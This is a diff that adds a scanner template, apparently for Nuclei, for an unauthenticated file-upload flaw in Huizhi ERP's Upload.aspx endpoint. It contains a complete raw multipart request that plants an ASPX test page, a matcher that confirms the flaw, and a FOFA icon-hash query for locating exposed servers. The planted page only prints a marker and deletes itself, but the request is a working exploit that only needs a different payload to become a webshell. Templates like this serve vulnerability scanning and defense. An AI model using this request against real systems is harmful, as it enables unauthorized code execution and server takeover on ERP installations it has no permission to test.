@@ -1,0 +1,53 @@
+id: huizhi-erp-uploadaspx-upload
+
+info:
+  name: "汇智ERP Upload.aspx 接口文件上传漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: icon hash="-642591392"
+          汇智ERP系统Upload.aspx接口存在文件上传功能安全缺陷，攻击者可绕过身份验证机制上传任意文件至服务器，通过植入恶意代码实现远程代码执行，最终可能导致服务器控制系统权限。该漏洞利用可创建持久化后门并横向渗透内网资源。
+  tags: 汇智ERP
+
+http:
+- raw:
+  - |
+    POST /nssys/common/Upload.aspx?Action=DNPageAjaxPostBack HTTP/1.1
+    Host: {{Hostname}}
+    Accept-Encoding: gzip, deflate
+    Content-Type: multipart/form-data; boundary= ----WebKitFormBoundaryLkkAXATqVKBHZ8zk
+    Connection: close
+
+    ------WebKitFormBoundaryLkkAXATqVKBHZ8zk
+    Content-Disposition: form-data; name="__VIEWSTATE"
+
+    /wEPDwUJOTc0NzkxMzQ1D2QWAgIDDxYGHhdJc0JlZm9yZU9wZXJhdGVTYXZlRGF0YWgeBmlzZ3VpZAUBMR4OY2hlY2tmb3Jtc3RhdGUFATBkZHwobq1hNj9MTgjOtrIn/0gbCdhD
+    ------WebKitFormBoundaryLkkAXATqVKBHZ8zk
+    Content-Disposition: form-data; name="__VIEWSTATEGENERATOR"
+
+    573D6CFB
+    ------WebKitFormBoundaryLkkAXATqVKBHZ8zk
+    Content-Disposition: form-data; name="upfile_Input"
+
+    ------WebKitFormBoundaryLkkAXATqVKBHZ8zk
+    Content-Disposition: form-data; name="upfile_upload"; filename="1"
+    Content-Type: image/jpeg
+
+    <%@ Page Language="C#"%><% Response.Write("NdayTest"); System.IO.File.Delete(Server.MapPath(Request.Url.AbsolutePath)); %>
+    ------WebKitFormBoundaryLkkAXATqVKBHZ8zk
+    Content-Disposition: form-data; name="upfilename"
+
+    NTest.aspx
+    ------WebKitFormBoundaryLkkAXATqVKBHZ8zk
+    Content-Disposition: form-data; name="dnpostmethodname"
+
+    uploadfile
+    ------WebKitFormBoundaryLkkAXATqVKBHZ8zk--
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'NdayTest'
